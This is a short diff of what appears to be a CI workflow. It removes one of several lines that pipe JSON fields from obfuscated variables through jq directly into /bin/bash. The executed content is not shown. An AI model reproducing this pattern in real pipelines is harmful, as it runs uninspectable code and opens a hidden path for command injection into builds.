@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
           echo $xhhq7952 | jq -r .y18 | /bin/bash
-          printf '%s' "$ld4748" | jq -r .weq973 | /bin/bash
           printf '%s' "$dw276" | jq -r .te725 | /bin/bash
 
       - name: Archive output
